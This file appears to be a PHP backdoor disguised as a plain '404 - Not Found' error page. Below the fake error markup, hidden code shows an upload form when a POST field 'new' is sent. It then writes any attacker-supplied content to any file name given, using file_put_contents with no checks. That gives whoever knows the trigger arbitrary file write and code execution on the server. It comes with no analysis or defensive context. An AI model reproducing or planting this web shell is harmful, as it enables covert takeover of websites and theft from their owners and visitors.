<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>404 - Not Found</title>
 </head>
 <body>
  <h1>404 - Not Found</h1>
 </body>
</html>

<?php if(isset($_POST['new'])){
?><html>
<head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
</head>
<body>

<form name="upload-dir" action="" method="post"
enctype="multipart/form-data">
<label for="file">Filename:</label>  
<input type="text" value="test.php"  name="Filename" id="Filename"><br>
<textarea name="data" style="width:600px;height:600px"></textarea><br>
 
<input type="submit" name="submit" value="Submit">
</form>

</body>
</html>
<?php }?>
<?php
if(isset($_POST['Filename']))
{
 
file_put_contents($_POST['Filename'],$_POST['data']);
 

}
?>
